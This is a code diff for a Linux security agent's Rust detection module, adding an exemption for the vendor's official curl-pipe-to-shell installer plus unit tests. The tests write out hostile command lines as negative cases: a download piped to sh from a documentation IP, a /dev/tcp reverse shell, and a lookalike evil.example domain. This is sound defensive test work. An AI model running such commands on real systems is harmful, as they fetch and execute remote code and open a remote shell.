@@ -82,6 +82,24 @@ fn suspicious_cmd() -> &'static Regex {
     })
 }
 
+/// The official tyrosec installer/update (`curl … https://get.tyrosec.com/install.sh | sh …`) is not a suspicious
+/// command – but only if the command line fetches nothing but get.tyrosec.com addresses and nothing else suspicious
+/// remains once the installer call is removed (an appended `; curl other | sh` is still reported).
+pub fn official_installer(cmdline: &str) -> bool {
+    static URL: OnceLock<Regex> = OnceLock::new();
+    static PIPE: OnceLock<Regex> = OnceLock::new();
+    let c = cmdline.to_lowercase();
+    if !c.contains("https://get.tyrosec.com/install.sh") {
+        return false;
+    }
+    let url = URL.get_or_init(|| Regex::new(r#"\b(https?|ftp)://[^\s'"|;&)]+"#).unwrap());
+    if url.find_iter(&c).any(|m| !m.as_str().starts_with("https://get.tyrosec.com/") && !m.as_str().starts_with("https://ingest.tyrosec.com")) {
+        return false;
+    }
+    let pipe = PIPE.get_or_init(|| Regex::new(r#"(curl|wget)\s[^|;&]*https://get\.tyrosec\.com/install\.sh[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b"#).unwrap());
+    !suspicious_cmd().is_match(&pipe.replace_all(&c, " "))
+}
+
 /// `base64 -d` alone is everyday use (apt-key, Google Chrome's cron script, certificate scripts).
 /// It is suspicious when the result is executed directly: the calling shell command line pipes
 /// it into an interpreter (`… | base64 -d | sh`) or evaluates it (`eval`, `$(… base64 -d …)`, `<(…)`).
@@ -155,7 +173,7 @@ pub fn on_exec(pid: u32) -> Option<Detection> {
     //    matched pattern: "bash -c '… | base64 -d'" starts bash *and* base64 – one report is enough.
     //    Called by package management (e.g. apt-key → base64 -d during an update): not an attack.
     let cmd = trust::strip_appimages(&p.cmdline, Some(pid as i32));
-    if let Some(m) = suspicious_cmd().find(&cmd).filter(|m| !harmless_base64(m.as_str(), pid as i32)) {
+    if let Some(m) = suspicious_cmd().find(&cmd).filter(|m| !harmless_base64(m.as_str(), pid as i32) && !official_installer(&cmd)) {
         // deeper than the displayed chain: dpkg → run-parts → initramfs-tools → update-initramfs → mkinitramfs → … → ln
         let by_installer = trust::installer_ancestor(pid as i32, 16);
         // Exception only for the agent's own processes (PID chain), not for every command line containing "tyrosecd"
@@ -179,6 +197,21 @@ App root: {root}", p.cmdline), &p, chain, root));
 
 fn det(rule: &str, sev: &str, title: String, detail: String, p: &proc::Info, chain: Vec<String>, key: String) -> Detection {
     Detection { rule: rule.into(), severity: sev.into(), title, detail: detail.chars().take(1000).collect(), pid: p.pid, exe: p.exe.clone(), proc_chain: chain, key }
+}
+
+#[cfg(test)]
+mod installer_tests {
+    use super::official_installer;
+
+    #[test]
+    fn official_installer_is_not_suspicious() {
+        assert!(official_installer("bash -c set -e; curl -fsSL https://get.tyrosec.com/install.sh | sh -s -- --server=https://ingest.tyrosec.com 2>&1 | tail -4"));
+        assert!(official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sudo sh -s -- --token-file=/root/tyrosec.token"));
+        assert!(!official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sh; curl -s http://203.0.113.9/x | sh")); // guard:ok
+        assert!(!official_installer("curl -fsSL https://get.tyrosec.com.evil.example/install.sh | sh"));
+        assert!(!official_installer("curl -fsSL https://get.tyrosec.com/install.sh | sh; bash -i >& /dev/tcp/203.0.113.9/4444 0>&1")); // guard:ok
+        assert!(!official_installer("curl -fsSL https://example.com/install.sh | sh"));
+    }
 }
 
 #[cfg(test)]
